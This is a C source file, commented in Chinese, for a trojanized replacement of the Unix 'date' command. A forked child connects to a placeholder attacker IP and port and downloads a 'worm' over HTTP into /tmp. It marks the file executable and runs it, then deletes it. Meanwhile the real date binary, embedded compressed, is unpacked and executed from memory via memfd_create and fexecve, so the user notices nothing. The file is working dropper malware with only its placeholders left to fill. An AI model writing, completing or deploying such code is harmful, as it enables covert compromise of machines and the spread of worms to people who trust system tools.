#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <zlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "orig_date_data.h"

extern char **environ;

int download_worm(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server.sin_addr);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        close(sock);
        return -1;
    }

    // HTTP GET
    char req[256];
    snprintf(req, sizeof(req), "GET /worm HTTP/1.0\r\nHost: %s\r\n\r\n", ip);
    send(sock, req, strlen(req), 0);

    FILE *fp = fopen("/tmp/worm", "wb");
    if (!fp) {
        close(sock);
        return -1;
    }
    char buf[4096];
    int header = 1;
    while (1) {
        ssize_t n = recv(sock, buf, sizeof(buf), 0);
        if (n <= 0) break;
        if (header) {
            char *body = strstr(buf, "\r\n\r\n");
            if (body) {
                body += 4;
                fwrite(body, 1, n - (body - buf), fp);
                header = 0;
            }
        } else {
            fwrite(buf, 1, n, fp);
        }
    }
    fclose(fp);
    close(sock);
    return 0;
}

int main(int argc, char *argv[]) {
    // ---------------------------------------------------------
    // 1. 背景執行 Payload (下載並執行蠕蟲)
    // ---------------------------------------------------------
    pid_t pid = fork();
    if (pid == 0) {
        // 下載 worm
        if (download_worm("<ATTACKER_IP>", <ATTACKER_PORT>) == 0) {
            chmod("/tmp/worm", 0755);
            execl("/tmp/worm", "/tmp/worm", (char *)NULL);
            perror("worm exec failed");
        }
        // 下載失敗或執行失敗都直接結束
        exit(0);
    }

    if(pid > 0){
        waitpid(pid, NULL, 0);
        unlink("/tmp/worm");
    }

    // ---------------------------------------------------------
    // 2. 記憶體內解壓縮原始 date
    // ---------------------------------------------------------
    unsigned long dest_len = <ORIGINAL_SIZE>;
    unsigned char *dest_buf = malloc(dest_len);
    uncompress(dest_buf, &dest_len, orig_date_gz, orig_date_gz_len);

    // ---------------------------------------------------------
    // 3. 執行原始 date
    // ---------------------------------------------------------
    int fd = memfd_create("hidden_date", 0);
    write(fd, dest_buf, dest_len);
    free(dest_buf);

    // 等待 Payload 發動後，用 fexecve 替換當前行程為原本的 date
    fexecve(fd, argv, environ);
    perror("fexecve failed");
    
    return 0;
}